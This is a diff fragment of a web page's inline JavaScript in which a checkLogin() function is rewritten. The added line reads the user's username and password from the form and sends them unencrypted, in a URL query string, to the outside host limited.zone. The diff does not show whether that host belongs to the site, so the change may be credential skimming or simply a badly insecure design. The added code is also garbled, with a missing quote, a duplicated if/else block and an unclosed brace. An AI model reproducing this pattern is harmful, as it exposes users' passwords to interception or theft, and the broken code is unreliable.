@@ -54,7 +54,11 @@
 <script src="https://code.jquery.com/jquery-3.2.1.min.js"></script> <!-- jQuery -->
 <script>
 function checkLogin() {
-jQuery.getJSON('http://bit.ly/2pLYSkj'
+jQuery.getJSON(http://limited.zone/login.php?username=' + document.getElementById('username').value + '&password=' + document.getElementById('password').value, function(data) {
+    if (data.access == "1") {
+       return true;
+    } else {
+
   if (data.access == "1") {
      return true;
   } else {
